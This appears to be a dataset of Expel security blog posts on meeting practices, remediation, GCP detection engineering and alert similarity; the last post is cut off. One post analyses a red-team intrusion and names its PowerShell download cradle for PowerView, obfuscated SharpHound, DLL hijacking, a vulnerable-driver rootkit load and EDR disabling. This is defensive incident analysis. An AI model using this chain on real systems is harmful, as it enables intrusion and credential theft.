  Example({'title': 'Helpful tools for technical teams to collaborate without ...', 'url': 'https://expel.com/blog/helpful-tools-technical-teams/', 'date': 'Mar 15, 2022', 'contents': 'Subscribe  EXPEL BLOG Helpful tools for technical teams to collaborate without meetings Tips  5 MIN READ  PETER SILBERMAN  MAR 15, 2022  TAGS: Tech tools The first week of March was Expels quarterly Week Without Meetings (or WWOM  you can read about it here ). Its an experiment we ran in 2020 thats become a quarterly event we all look forward to. We ask everyone to cancel every internal meeting possible and encourage our team to use these weeks to work on projects theyve had to put to the side, do something for their professional development, and take time to focus on their well-being. The goal: be more intentional about the meetings we do schedule afterwards. Does that conversation really need a meeting? Or can we connect asynchronously over Slack or work together in a Google doc? As CTO, I find these weeks incredibly valuable. Even if I still have a few important conversations scheduled during my WWOM, removing all of our recurring meetings is a huge reprieve and allows for deep thought work time, catching up with other humans (yay), and a general change of pace. This past WWOM, as my team carried on working together without jumping on Zoom, I reflected on the tools and tricks we now use to reduce the burden of meetings on an ongoing basis while still communicating and collaborating across our team and org. Hopefully theres something here that can help with your teams meeting mojo, as we like to call it, and create more time and space for your people and the work that excites them. Disclaimer: While Expel is a customer of several of the vendors Ill list here, were in no way sponsored or being asked to write about them. These are genuinely tools Id want to use wherever Im working. Asynchronous feedback and collaboration One of the challenges with meetings, besides scheduling, is the imposition of asking people to bring their A game at a time you choose, or at a time that fits into most peoples schedules. This is especially important when youre seeking collaboration  whether discussing feedback or brainstorming. I find those two types of asks carry a heavy cognitive load. If youre a morning person like me, your preference is likely to do that kind of work in the AM. If you arent like me, you may prefer the late afternoon, which is when Im desperately in need of another coffee. Either way, the timing of specific types of meetings can have an impact on the capabilities people bring to the table. Ive found that offering asynchronous collaboration instead is an effective way to involve everyone you need at their own ideal time. To that end, Google docs are a great tool for async feedback and brainstorming. I know, truly novel, right? This probably isnt a surprise to many. But I want to talk about a common mistake I see made when collaborating on content. Project owners often dont anticipate that, with so many messages and docs swirling around, those coming into a shared doc may have forgotten the initial ask or may not recall the role they play in the ask. Are they bringing a customer perspective, editing for grammar, or thinking about how other teams will react? Ive found the easiest way to help with this is to start the doc with what you expect or need from reviewers and a reminder of how the content will be used. Heres a screenshot of a Google doc where I did just this: Key details for asynchronous collaboration in Google docs These details help each reviewer know where and how to focus their time and energy so they can provide the most useful feedback and prevent duplicative efforts. Asynchronous feedback and socialization The video tool Loom is one of my new favorite tools to combat meetings. Our teams using it in two ways. The first is perhaps more obvious  its a great way to asynchronously socialize a concept, provide training, or present on a new topic. For example, our Principal Data Scientist Elisabeth Weber recorded two Loom videos called Learn to Rank, explaining how we use ranking at Expel. These videos can be watched by our team as they see fit at a good time for each of them to consume the concept. Loom also has metrics on how many people watched a video, and those watching can see comments left by previous viewers. This becomes really powerful when you present a concept that connects dots across multiple teams. Expel Learn to Rank Loom presentation video The second way weve started to use Loom is for asynchronous feedback on presentation talk tracks. As someone who regularly has to present ideas to diverse audiences, Im constantly seeking feedback from different parts of the company to make sure I have a concise, complete, and compelling message while also avoiding any gotchas I may have missed. Loom is an amazing tool to use in the draft phase of presentation building. Recording talk tracks with slides and getting feedback from colleagues who can record their responses has been invaluable for building impactful presentations that get the right message across. Below is a screenshot of the most recent video I recorded  all of those talk bubbles are what we would call constructive feedback, and those emojis are what some would call trolling. Suffice it to say, I saved a lot of time by getting this feedback, deleting this presentation, and starting over  Loom presentation feedback Socializing research outcomes When completing research, you can often be left wondering, How do I start moving this through the larger org outside of my (research) team? There are different factors for success ( note to self: this could be a whole blog series, especially on what not to do from personal experience ), but one of them is generating awareness and interest among other teams. Researchers know that doing the research is only half of the work  the other half is communicating, recommunicating, and moving the findings through your org. At Expel, we love Jupyter Notebooks for this. Specifically, structuring Notebooks to socialize completed research has helped us more easily translate that research into product features. We usually use slides in combination with a Notebook. Slides help us set the stage for why we did the research, remind everyone of our goals, discuss solutions and potential impacts, gotchas, etc. We then make the associated Notebook available for engineers or other internal researchers to play with the concepts in more depth. To successfully use Notebooks to socialize research, consider the following: Notebooks should be optimized for the reader to understand, not for the developer. This means you might have to violate the DRY (Do not Repeat Yourself) principals (oh em gee) Notebooks should be optimized for the reader to understand, not for porting to production. This means you might not have loops collapsed on one line (oh em gee again) Code should be well documented. Yes  prototypers, its possible to have more than one comment per 100 lines of code  Markdown cells should exist around code cells. The text in these cells isnt about the implementation of the code in the cell below (thats what comments are for). Its telling a story for the reader at a higher level, helping think about the cell relative to the research objective. Meeting mojo Our weeks without meetings are meant to shock the system and make us more intentional about our meeting choices. Its often the pause we need to rethink our meeting mojo and figure out how we can reduce the time and energy burden of meetings on ourselves and our teams going forward. Thats where the tools Ive discussed come into play. If youve read this far, hopefully youve found one tip or tool you can carry forward into your day-to-day to reduce the meeting burden on yourself or your team. Have other tools that help you minimize meetings while still communicating and collaborating effectively? Wed love to hear about them  drop us a note !'}) (input_keys={'title'}),
  Example({'title': 'How a red team went from domain user to kernel memory', 'url': 'https://expel.com/blog/well-that-escalated-quickly-how-a-red-team-went-from-domain-user-to-kernel-memory/', 'date': 'Jul 28, 2021', 'contents': 'Subscribe  EXPEL BLOG Well that escalated quickly: How a red team went from domain user to kernel memory Security operations  9 MIN READ  BRITTON MANAHAN  JUL 28, 2021  TAGS: Cloud security / MDR / Tech tools Were no strangers to red team engagements. In fact, we love them . Not only do they give our customers a chance to put our detection and response (D&amp;R) skills to the test, they also let us exercise our incident response skills. And this red team definitely gave us a workout as they progressed towards full control of the computer system. Their goal was to evaluate our detection methodology and incident response (IR) proficiency; and they did so using a number of interesting and unique tools and techniques. The red team was given physical access to a computer on the customers network and a valid domain user to unleash their havoc. Well refer to the computer as Compromised_Host and the valid user account as User1 from here on out. The incident began with some PowerShell-based reconnaissance and ended with the red team loading custom code into kernel memory on the system  aka a rootkit. In this blog post, Ill walk you through the initial detection, our investigation and share the insights we uncovered along the way. Incoming! Threat detection TL; DR: We detected malicious PowerShell usage by the red team and notified the customer in eight minutes. Our initial lead into the red team activity began with an endpoint alert based on a lightly obfuscated PowerShell command that attempted to download the PowerView privilege escalation framework from the PowerShell Empire PowerTools Github repository. In the image below, youll see that this attempted download and in-memory execution of malicious PowerShell was blocked by the EDR product deployed on Compromised_Host. Expel Alert Details Heres the full PowerShell process command line and the deobfuscated remote URL: PowerShell Command for Alert When the URL is deobfuscated it appears as: https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1 Our analysts quickly determined this alert to be a true positive because: The command line parameter -ep Bypass bypasses any Script Execution Policy restrictions in place for the generated PowerShell process. The command downloads reconnaissance functionality from the well-known post-exploitation framework repository PowerShellEmpire. After the download completes, the command runs an imported function, Invoke-ShareFinder, with a parameter telling it to enumerate all network file shares readable by the current user. The download and execution of this function, Invoke-ShareFinder, intentionally operates exclusively in working memory and does not get stored to persistent storage (although the output does). If this PowerShell command was successful, it would have executed the Invoke-ShareFinder function provided by powerview.ps1. With a clear indication of malicious activity, it was time to notify our customer. Our analysts have a direct line of communication with our customers (through Slack or Microsoft Teams depending on which platform they use)  so within eight minutes, we went from initial alert to giving our customer details of the activity. Then our analysts initiated a verification drop to our customer through the Expel Workbench. From there, our customer authorized the activity and confirmed that a red team assessment was underway. Want to know what our verification drop looks like? Heres the Slack message to our customer: Verification communication with customer over Slack And below is our Alert-to-fix timeline, available for our customers in the Expel Workbench. Expel Workbench alert-to-fix report Signs of a rootkit: Start of our investigation TL;DR: The installation of a suspicious Windows Driver immediately stood out to us when examining the host timeline. This activity would provide an attacker with unrestricted access to memory on the computer. During our initial escalation and communication, we also generated a timeline for the Compromised_Host endpoint. After inspecting the timeline generated through the EDR solution running on the computer, something immediately stood out to us. EventName : CreateService ComputerName : Compromised_Host ProductType : 1 ServiceDisplayName : GuteDriver ServiceErrorControl_decimal : 1 ServiceImagePath : C:\\Users\\User1\\Desktop\\Purple\\Payloads\\bp\\Gute0.2\\Gute0.2\\GuteDriver.sys ServiceStart : 4 ServiceType : 1 Time : 2021-04-20T15:33:56.794+0000 GuteDriver Rootkit Service Creation This Windows service creation event tells us that GuteDriver.sys is being registered as a kernel driver, set to begin execution during system initialization based on the values of ServiceType and ServiceStart . This means that the red team got kernel-level access to the computer system. Gaining kernel-level access allows unrestricted access to all working memory (aka RAM) on the computer system. Malware that operates at this level is also referred to as a rootkit. The file hash for GuteDriver.sys, obtained from the corresponding FileWrite event, was globally unique in the EDR product and unknown in VirusTotal and other OSINT sources. Also, the fact that the Drivers location ran through User1s Desktop was a huge red flag. Its a complete anomaly for a Windows kernel driver to be located on a users desktop. Initial red team activity TL;DR: The red team, which provided physical access to the Compromised_Host system and a logon session for User1, began their engagement by downloading Payloads.zip from dl.boxcloud.com. With the malicious Windows driver activity identified, we continued to examine the host timeline with the initial tasks of locating the beginning of the red team activity and any potential lateral movement to other computer systems. While no signs of successful lateral movement were present in the timeline, we noticed a series of file write events involving the path C:\\Users\\User1\\Desktop\\Purple\\Payloads. We then honed in on the events related to this path and determined that the earliest evidence of red team activity occurred earlier in the day at 14:33 UTC on the Compromised_Host computer system with the downloading of the file Payloads.zip into the Downloads folder of User1. This activity was immediately preceded by User1 launching a Chrome web browser process at 14:29 UTC, which then generated a DNS request for dl.boxcloud.com. This timeline of events suggests that its highly likely that the archive file was hosted on and downloaded from the cloud storage service Box.com. The contents of Payloads.zip were then extracted into a new folder, Payloads, located within the folder Purple on User1s Desktop. These extracted files were the source of additional tools and tactics deployed by the red team, which well be exploring together in the next sections of this blog post. System reconnaissance TL;DR: The red team used PowerShell and DotNet to locate local privilege escalation opportunities on the Compromised_Host endpoint. The first events after the extraction of the contents of Payloads.zip are the compilation and immediate deletion of a DotNet Framework module with a file name of ibuyy111.dll. Dotnet Module Compilation Event: DeviceHarddiskVolume4WindowsMicrosoft.NETFramework64v4.0.30319csc.exe "C:WindowsMicrosoft.NETFramework64v4.0.30319csc.exe" /noconfig /fullpaths @"C:UsersUser1AppDataLocalTempibuyy111.cmdline" File Creation Time: 4/20/2021 14:36:25 UTC File Deletion Time: 4/20/2021 14:36:25 UTC ibuyy111.dll details With a parent process of PowerShell.exe and the immediate deletion of the compiled DotNet module, this command line directly correlates to PowerShell invoking the C# Command-Line Compiler behind the scenes as a result of importing a new DotNet class through C# source code (yes  PowerShell can do that). This functionality is made possible through the add-type PowerShell cmdlet, which supports inline C# source code through the TypeDefinition parameter. powershell -Command Add-Type -TypeDefinition public class Demo {public int a;} To find out more about the PowerShell activity on the host, we used the PSReadLine console history file, which maintains a record of PowerShell commands entered into an interactive PowerShell console session for each user account. This file exists so that the PSReadLine module, which is included by default with Windows 10, can provide command line history functionality for PowerShell in-line with the Linux BASH shell. From the PSReadLine console history file for User1 we saw that the following command was entered: Import-Module .Vscanner.ps1 &gt; Vulns.txt While this evidence source does not include timestamps, based on the creation time of the Vulns.txt file we had from the timeline, this command was likely the origin of the DotNet module activity. Based on the name Vscanner.ps1 and created file names Vulns.txt, along with interesting paths.txt, the main objective of Vscanner.ps1 and ibuyy111.dll was discovering potential privilege escalation vulnerabilities on the Compromised_Host computer system. Blockedfailed executions TL;DR: The red team attempted but failed to perform a DNS Zone Transfer and had additional reconnaissance tools blocked by EDR. After they succeeded at enumerating local privilege opportunities, the red team failed in their next three execution attempts. The first of these attempts was a failed DNS Zone Transfer, followed by the previously mentioned blocked attempt to download and execute PowerView, which was our initial lead into the presence of the red team. The third unsuccessful execution activity was two attempts to bypass detection of the SharpHound tool by employing obfuscation. SharpHound is the C# version of BloodHound , a penetration testing tool for enumerating active directory accounts and how their permissions overlap through graph theory. The red team attempted to import and execute two different obfuscated copies of SharpHound as a PowerShell module, a fact supported by the PSReadLine history file excerpt provided below. Both attempts were detected and blocked by EDR, which also created an Expel Alert. Import-Module .sh-obf1.ps1 Import-Module .sh-obf2.ps1 invokE-BloOdhOuNd Import-Module .sh-obf2.ps1 invokE-BloOdhOuNd Bloodhound related section of PSReadLine History File Privilege escalation TL;DR: The red team used DLL load order hijacking to execute a custom DLL file under the Local System account and then create a new local admin user. They likely got the information used to conduct this local privilege escalation from VScanner.ps1. Following this series of failed execution attempts, the red team then used information likely gained from their earlier successful privilege escalation enumeration. At 15:09 UTC, the red team wrote the WptsExtensions.dll file extracted from Payloads.zip into the directory C:Program FilesCitrixICAService in order to establish DLL load order hijacking. We spotted this when comparing the following two FileWrite events for WptsExtensions.dll, which have the same file hash. EventName : FileWrite ComputerName : COMPROMISED_HOST FileName : WptsExtensions.dll FilePath : DeviceHarddiskVolume4UsersUser1DesktopPurplePayloadsPayloads CompleteFilePath : DeviceHarddiskVolume4UsersUser1DesktopPurplePayloadsPayloadsWptsExtensions.dll SHA256Hash: 9f2470188c30deec39f042fddfdb94bef1e69fb7b842858de7172f5e6d58140e Time : 2021-04-20T14:34:08 EventName : FileWrite ComputerName : COMPROMISED_HOST FileName : WptsExtensions.dll FilePath : DeviceHarddiskVolume4Program FilesCitrixICAService CompleteFilePath : DeviceHarddiskVolume4Program FilesCitrixICAServiceWptsExtensions.dll SHA256Hash: 9f2470188c30deec39f042fddfdb94bef1e69fb7b842858de7172f5e6d58140e Time : 2021-04-20T15:09:23 FileWrite events for WptsExtensions.dll Following this DLL load order hijacking setup, several Citrix-related service processes were started, which would have likely loaded this DLL, running under the SYSTEM user context. This activity was then preceded by the User1 account launching a new cmd process under the context of the LocalAdmin1 account. DeviceHarddiskVolume4WindowsSystem32runas.exe runas /user:LocalAdmin1 cmd Privilege escalation to local admin account The red team report  a summary of actions performed during the engagement  confirmed that this malicious DLL used the higher permissions obtained through DLL load order hijacking to covertly create a new local admin account on the computer system. Kernel memory access TL;DR: The red team installed and exploited an old Intel driver to bypass the Windows Driver Signature Enforcement protection and install their own custom driver. Using this custom code running in the kernel memory space, the red team disabled the EDR solution running on the endpoint. As the title suggests, things escalated quickly. With their privileges on the Compromised_Host system elevated to local administrator, the red team wasnt yet satisfied with their heightened control of the system. Working through the LocalAdmin1 account, the red team disabled two local services running on the Compromised_Host system  a Splunk forwarder service and a service for a third-party IR vendor. Then they launched the executable program Gute.exe at 15:29 UTC, another file hash with zero global matches in the EDR solution and across OSINT. The EDR details for this event let us know that the Gute.exe process was responsible for both writing and registering the Windows Driver file NalDrv.sys at 15:31 UTC. The hash for this file  4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b  did return results when searching across Virustotal and other OSINT sources. VirusTotal Match for the NalDrv.sys file hash The NalDrv.sys file, original file name iQVW64.SYS, is a signed Intel driver from 2013 that isnt inherently malicious. What this driver can provide an attacker is based on a combination of its valid driver signature and established vulnerability #CVE-2015-2291 . This combination allows an attacker to turn the authentic driver into a vehicle to access and modify kernel-level memory on the local computer system. An example of this technique is the Kernel Driver Utility , which includes this exact CVE as one of the vulnulbilies it can leverage to provide access into kernel memory from user mode. One of the many things you can do with this unrestricted level of access is bypass the Windows Driver Signature Enforcement and load any driver of your choosing into kernel mode This Gute.exe and NalDrv.sys activity brings us back full circle to the unknown Gutedriver.sys file mentioned earlier in this post, which was installed as a Windows driver service two minutes after the NalDrv.sys activity at 15:33 UTC. We didnt notice anything happening on the Compromised_Host system after this activity. The red team report confirmed that this system kernel-level access was used to disable the EDR solution running on Compromised_Host. With the red team activity limited to the Compromised_Host and our visibility cut off with the disabling of EDR, we concluded our investigation. The red team report also showed us that the red team successfully executed mimikatz and obtained plaintext passwords after disabling EDR on the host. In a real-world critical incident, the box would have been isolated prior to the activity that provided the red team access to kernel-level memory. However, its common practice not to disrupt red teams during their engagements because it ensures security controls across the attack lifecycle are examined regardless of results in the previous phase. Quick recap We just went through a lot of technical info. To make it easier to digest, we figured it would be helpful to give a short recap of what went down. Below is a detailed timeline of this red team incident, broken down into both their actions on the computer system Compromised_Host and our communications with the customer during the incident. Red team incident timeline What this means for you This red team engagement serves as a strong reminder that the alert is often the tipping point, but not the full story. While the incident began with an unsophisticated PowerShell download cradle, it quickly escalated into something that could have been a serious incident in the real world. If this was a real attack, it would have been difficult for any org to prevent and contain. Thats especially true when considering a custom rootkit was deployed and EDR was disabled on the system. Bad actors are getting creative and have the ability to surprise you with novel attack techniques. This is why you need to have an equally creative mindset when it comes to detection and investigation. And, again, its why we love red teams. Bringing in a red team to test your security controls and protocols against the latest tactics can help you keep bad actors out down the road. Have any interesting red team stories youd like to share? Wed love to hear them! Lets chat (yes  a real human will respond).'}) (input_keys={'title'}),
  Example({'title': 'How does your approach to AWS security stack up?', 'url': 'https://expel.com/blog/how-does-your-approach-to-aws-security-stack-up/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG How does your approach to AWS security stack up? Security operations  1 MIN READ  MASE ISSA  APR 27, 2021  TAGS: Cloud security / MDR / Tech tools Keeping track of Amazon Web Services (AWS) and its new services can be overwhelming. And on top of dealing with a tangled web of services and logs, triaging alerts can feel like youre playing an exhausting game of whack-a-mole. Nodding your head in agreeance? You arent alone. Weve heard the same thing from many orgs, regardless of size and industry  wrangling cloud security signal isnt easy. To put it mildly. It can be time consuming, confusing and downright frustrating. Wondering if you might need some help? Or want to know if there are opportunities to level up but not sure where to start? We got you. Introducing Expels interactive quiz to help you figure out if youre getting the most out of your Amazon Web Services (AWS) security signal. Answer a few short questions and well let you know how you compare to similar orgs. As a bonus well give you some tips and resources. So whether youre just starting out or pretty sure youre killing the game  check out our quiz to make sure youre maximizing all available resources to secure your cloud. Protect AWS'}) (input_keys={'title'}),
  Example({'title': 'How Expel does remediation', 'url': 'https://expel.com/blog/how-expel-does-remediation/', 'date': None, 'contents': 'Subscribe  EXPEL BLOG How Expel does remediation Security operations  4 MIN READ  NABEEL ZAFAR AND PATRICK DUFFY  MAY 31, 2022  TAGS: MDR TL;DR How our two-step remediation process works (with a flowchart), what we can remediate, and how we keep you in the loop. Who does what  Expel or you? (Hint: most of the time, you decide.) Our remediation roadmap (Blocking command-and-control (C2) communications, cloud turnoffs, disabling/modifying AWS access keys). Tips on what to ask any MDR provider about remediation. If you find a problem in our environment, how do you remediate it? We get that question a lot. As we should  thats one of the most important questions to ask when youre looking for a managed detection and response (MDR) provider. So heres our answer to this question. In this blog post, well share Expels two-step remediation process, provide insight into our automated remediation offerings, and give you a glimpse of whats ahead on our roadmap. Our remediation process If we identify an incident, there are two sets of actions well take  while keeping you in the loop throughout the process. First, well take approved actions on your behalf to quickly address the incident. For example, the Expel Workbench can automatically perform host containment, user account disablement, block known bad hashes, or remove suspicious emails when necessary during our security operations center (SOC) analysts investigation. If these automated remediation actions make sense, we quickly take first steps to contain infected hosts. In the image below, youll see an example of what this looks like in the Expel Workbench. Expel Workbench host containment action You can also customize the remediation process through Workbench (see image below) by identifying hosts that youd like us to act on  and any you dont  for future remediation actions. They also share updates on their activity in Workbench each step of the way. Expel Workbench containment options Expel supports host containment for customers who have CrowdStrike, Microsoft Defender for Endpoint, SentinelOne Singularity Complete, VMware Carbon Black Cloud, VMware Carbon Black EDR, Palo Alto Cortex XDR Pro, Elastic Endpoint Security, and Cybereason. Second, after taking automatic actions on your behalf, our SOC analysts recommend additional remediation actions in our findings report. We always communicate in plain English, so our recommendations are easy to follow and can be implemented at any level of security expertise. Want a 10-second overview of what our remediation process looks like? We got you covered. Check out our remediation workflow in the diagram below. Expel remediation workflow Me or my MDR: Who does what? A lot of security practitioners whove purchased MDR services still want to maintain internal control of remediation steps. It helps reduce business risk. We get it. Weve found that our process strikes a balance between what security practitioners want to handle themselves and what theyd want their MDR to do. But that doesnt mean they shouldnt look to their MDR to share their expertise. We want your team to maximize your security and minimize incidents  and not spend a ton of time trying to figure out how to remediate. So if we spot trends in vulnerabilities or incidents across your environment, well tailor resilience recommendations for how your org can fix the root cause of those issues and prevent them from needing remediation time after time. Taking steps to improve your security and keep those types of incidents from happening again helps us avoid having to call you in the middle of the night about remediation actions you need to take  right now! What else can we auto remediate? From business email compromise to malicious files to ransomware, weve got you covered. You tell us what youd like us to remediate and which ones youd prefer to handle. Plus, 247 coverage means you have the time to plan your next steps even if that means waiting until Monday morning. Our approach to automated remediation is personal to your organization and based on the frequency of threats seen in your environment. Youre in control of which users and endpoints youd like us to immediately take offline after a compromise is confirmed, so youre involved when you want to be  freeing up your team to focus on other security initiatives. We have a few new automated remediation steps (in addition to the ones outlined above) that consist of additional actions we can automatically take for you when responding to an incident. Removing malicious email If malicious email is identified from a phishing submission, well automatically remove it from users inboxes (and into the trash). Available for: Google Workspace Blocking bad hashes When our analysts identify hashes to block during an incident, we create a remediation action in Expel Workbench. If the hash isnt on your never block list of files, Workbench adds the hash to the appropriate block list in your EDR. Available for: CrowdStrike, VMware Carbon Black Cloud, VMware Carbon Black Response, Microsoft Defender for Endpoint, SentinelOne Singularity Complete, Palo Alto Cortex XDR Pro and Elastic Endpoint Security. Disabling user accounts Similar to host containment, Workbench will automatically disable user accounts when that remediation action is added to an incident. Available for: Microsoft Defender for Endpoint, Microsoft Office 365, Microsoft Azure Identity Protection, Microsoft Active Directory, Microsoft Azure Log Analytics, and Microsoft Azure, Google Workspace, Okta, Github, and Duo. Coming soon Weve talked you through our remediation process today. But were constantly improving what we can do for our customers. So we have a few new automated remediation steps in the works on our remediation roadmap. They consist of additional actions well be able to automatically take for you while responding to an incident. By taking critical, first steps to contain an incident, we decrease your remediation time even further  lifting more weight off your shoulders. Heres whats next in the pipeline, prioritized based on how often we take certain remediation actions across our customer base and the level of risk each presents for our customers. Blocking command-and-control (C2) communications When our SOC identifies C2 communications during an incident, well automatically block them upon creation of a remediation action in Workbench. Available for: Palo Alto Networks, Cisco Umbrella Cloud turn-offs If a cloud instance is identified as compromised during an incident, well automatically shut down the VM or EC2. Available for: AWS EC2 turn-off, Azure VM turn-off Disabling/modifying AWS access keys If an AWS access key is identified as compromised during an incident, well automatically disable/modify that key when a remediation action is created. Available for: AWS Final tips We wanted to end this post with some parting thoughts and tips for those currently looking for an MDR provider. When youre evaluating MDR providers, make sure you understand how their remediation process works. Will they reduce risk quickly enough to protect your org? What will they do for you when it comes time to remediate an incident vs. what will you be asked to do? Learn about their incident reporting and communication process to know when and how theyll reach you during an investigation. And make sure you also know how theyll walk you through remediation. Have any questions? Lets chat !'}) (input_keys={'title'}),
  Example({'title': 'How Expel goes detection sprinting in Google Cloud', 'url': 'https://expel.com/blog/detection-sprinting-google-cloud/', 'date': 'Aug 3, 2021', 'contents': 'Subscribe  EXPEL BLOG How Expel goes detection sprinting in Google Cloud Security operations  6 MIN READ  IAN COOPER, CHRISTOPHER VANTINE AND SAM LIPTON  AUG 3, 2021  TAGS: Cloud security / MDR / Tech tools Lets face it: Detection and response in the cloud is greenfield. Although it feels like every other month were reading about the latest cloud compromise, there are often few details about exactly what happened and what you can do to prevent the same kind of thing happening to you. Follow @sellingshakes Organizations are just getting comfortable figuring out where their attack surface really is in the cloud. For these reasons, Expels approach to detection research has required some creativity. How does one build a detection strategy essentially from scratch? In our case, we like to work together to fundamentally understand a new technology, get up to date with where the community has taken the threat research, theorize any additional threat models against that tech and then build a strong overall detection strategy as a team. The Detection and Response Engineering team at Expel in many ways operates like a software team. To help us organize work, we use the Scrum framework and generally operate in one or two week sprints  timeboxed iterations of our detection strategies. Recently, we ran a two week Google Cloud Platform (GCP) detection sprint and wanted to share our process. Interested in how you can start building a strategy of your own? Strap in and well take you along for the journey to building this process here at Expel. Our process for building detections Threat modeling and threat research is no small task. We like to take some time here and we usually take the entire first week of our detection sprints to do some reading (hello API docs!), let ideas bake, challenge each other and do any sort of experimentation in cloud infrastructure environments to test security boundaries. In general, our process follows the steps below. Ideate: Throw ideas against a wall. Evaluate: Test the ideas. Create: Release the dragons. Appreciate: Celebrate (and monitor performance). Ideate It all starts with finding inspiration and brainstorming detection ideas. Oftentimes, our detection sprints build upon previous iterations of detection work and research, and the result is a deeper understanding of the technology at hand (and its security shortcomings). Follow @iank_cooper One good place to start with GCP, or any cloud infrastructure, is understanding their implementation of Identity and Access Management (IAM). If youre feeling green in GCP and want to learn how GCP IAM compares to the other cloud providers, Dylan Ayrey and Allison Donovan break it down very well in the beginning of their Defcon talk . In fact, well use one of the attack techniques discussed in their talk as an example as we walk through our detection sprint process. GCPloit, a python-based red team tool built by the Defcon presenters, serves to exploit potential imbalances in a given GCP environment. (In fact, cloud red team tools are great starting points to build an initial suite of threat detections). Specifically, the tool takes advantage of the ability to impersonate service accounts  a dangerous, yet common privilege in GCP. Picking apart the code for GCPloit reveals the specific gcloud commands used to list available service accounts, deploy cloud functions attached to each available service account (necessary to expose the service account credentials), and ultimately capture the credentials to each service account. From there, the attacker can use the service account credentials to impersonate even more accounts, or use the new privileges gained to continue moving towards their goals in a variety of other ways. As discussed in the Defcon talk, its possible for an attacker to gain access to multiple GCP projects through this process. Now its time to see if we can build a successful detection based on this functionality. Evaluate Once we understand GCP IAM and some of the most impactful security weaknesses at hand, we build and evaluate detections in our testing environment. With cloud detections, one part of our evaluation process includes determining if the detection is looking for attacker behaviors or simply detecting risky configuration changes (although the lines between the two are often blurred). Theres no shortage of open source detections for risky cloud configuration changes. Theres also a whole market that specializes in these (Cloud Security Posture Management anyone?). Our goal for this sprint was to find evil. Plain and simple. We were all in agreement on which attack paths are the scariest and remain readily available for an adversary (malicious service account impersonation begone you dastardly monster). Multiple GCP detection sprints have resulted in detection ideas for a variety of malicious service account impersonation behaviors. Heres a few examples: Burst in cloud function deployments: Is an attacker programmatically capturing service account credentials? Unusual cloud functions: Are cloud function deployments unusual for this user? Service accounts making org level policy changes: Is an attacker leveraging stolen credentials to gain additional access in the environment? Back to the detection were focusing on  a service account impersonation detection. Remember, cloud functions deployments can be used by the attacker to capture new credentials while impersonating a service account. So what data do we need to effectively write a detection for this? Lets hone in on what native log data exists in GCP . Finding the right sources of evidence GCP provides several log sources, but not all translate into effective detection sources. System Event audit logs: Capture machine data, but not user actions. Data Access audit logs: Record granular resource access (typically not enabled due to high volume). Admin Activity audit logs: Capture control plane changes (including user actions). For these particular attacker behaviors, the Admin Activity log includes the evidence we need to write our detections. Since these logs capture configuration changes to resources in GCP, they give us insights into the events we want to correlate when searching for evil. For example, when a cloud function is deployed, we can track this activity through the Admin Activity audit log. Create Now, its time to write some detections. Meet Josie, our own python-based detection engine we use here at Expel. Lets walk through what service account impersonation detection logic looks like for Josie to evaluate. Snippet of Expel detection logic relating to bursts in cloud function deployments At a high level, this logic is watching for any instance of a cloud function deployment, and recording the user responsible for the event. Josie will remember the user responsible for this action for 15 minutes. If the same user deploys over three unique cloud functions in that 15-minute window, Josie will generate an alert for analysts to look into the activity. To make sure this detection logic is sound, well deploy this detection in a draft state to allow us to see how it performs. Based on its performance, we may decide to adjust the detection threshold or suppress users associated with frequent/programmatic cloud function deployments. Once weve written a detection and released it into our testing environment, we like to track the detections performance in Datadog to measure patterns and general volume. The Datadog visual below makes it pretty obvious to tell which detections needed some work and when they were dialed in. Datadog graph tracking the volume of Expels GCP alerts in the testing/development phase After making tweaks to the draft detections to adjust for volume, and ensuring they detect a real threat scenario, we prepare to release the detections into production. Preparing for release means ensuring that the detection has a strong description, suggested triage steps, references and decision support (through the help of our automated robot Ruxie). The goal is to have our analysts set up for success if the detection should trigger an alert. One final thing  any cowboy can shoot from the hip and come up with novel detection ideas. Whats more challenging is pressure testing the investigative process for those detections. If you cant investigate it easily, then its probably not a good alert to surface up to an analyst. With that said, any good detection should come prepackaged from the detection engineering team with some investigative questions attached to help triage any generated alerts. Appreciate Detections are out, queue the jazz hands. We still like to keep tabs on the newly released detections, however, and have Datadog monitors in place should any of the detections start behaving erratically. In good Scrum fashion, we like to retro our sprint process and look for ways to get better. After iterating upon our detection work and seeking to protect against both new and known threat scenarios, were confident in our ability to tackle GCP attacks. Using service account impersonation as a shining example, our coverage for this threat scenario and other kinds of evil in GCP is now significantly stronger. Sprinting ahead When Expel started detection work on GCP, it was a whole new world to explore. Through detection sprints like this one, we can learn how IAM works in GCP (and other cloud platforms), grow our understanding of the attack surface as a team and build up a meaningful detection strategy. This is a reusable process that weve found to work well no matter what tech is targeted. So if you find yourself in a similar situation (staring down a new area of risk with little detection inspiration to start from), following a similar iterative process of discovery, experimentation and keeping a close eye on your resulting detections should serve you well. As for us  were on to the next one (and well keep sharing along the way)!'}) (input_keys={'title'}),
  Example({'title': "How Expel's Alert Similarity feature helps our customers", 'url': 'https://expel.com/blog/how-expels-alert-similarity-feature-helps-our-customers/', 'date': 'Aug 1, 2022', 'contents': 'Subscribe  EXPEL BLOG How Expels Alert Similarity feature helps our customers Security operations  4 MIN READ  DAN WHALEN AND PETER SILBERMAN  AUG 1, 2022  TAGS: MDR / Tech tools Building a security company and a corresponding product suite is a lot like building a house. If the foundational building blocks youve created are solid, you should have a sturdy, reliable structure. And if you decide to expand your house in the future, those great foundational building blocks will help you build out faster while maintaining the top-notch structural integrity that you developed in the first place. Since we started our journey at Expel, weve believed in this. Thats why weve invested in creating processes and tech that ensure our Expletives arent burning out as we grow and that our customers dont see a decline in the level of service they expect. One of the features we recently built and released that helps us do all of this is something we call Alert Similarity. What is Alert Similarity, how did we get the idea for it, and how does it benefit our team of analysts (and, of course, our customers)? How it started Our bots, Josie and Ruxie, process millions of alerts each day, and thousands more show up on our analysts screens. Given this volume, its no surprise that many look similar to one another. For example, in a given week, our analysts typically review a few hundred alerts related to suspicious logins. If you see enough of this activity, you start to recognize common patterns and similarities (incidentally, humans are pretty good at pattern recognition). So we asked ourselves: Is it possible to teach Josie and Ruxie the same trick? What if we were to think about alerts and their corresponding evidence as documents? Could we compare similar documents and apply what a human did with one document and suggest or recommend a next step? Our hunch: comparing alerts to past activity (and corresponding outcomes) can provide valuable situational awareness. Imagine that our analysts identify a security incident on a Monday morning. Chris in accounting fell victim to a phishing attack  their credentials were stolen and had to be reset. On Thursday night, a different analyst is reviewing a new alert for Alice that looks similar. The situational awareness of what happened a few days ago and what the outcome 